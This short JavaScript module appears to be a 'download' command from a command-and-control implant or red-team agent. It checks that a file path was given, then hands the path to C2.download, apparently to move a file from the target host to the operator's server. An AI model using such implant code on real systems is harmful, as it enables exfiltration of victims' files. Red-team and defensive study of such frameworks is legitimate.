exports.download = function(task, command, params){
    try{
    	if(params === "" || params === undefined){return {'user_output': "Must supply a path to a file to download", "completed": true, "status": "error"}; }
        return C2.download(task, params);
    }catch(error){
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
};
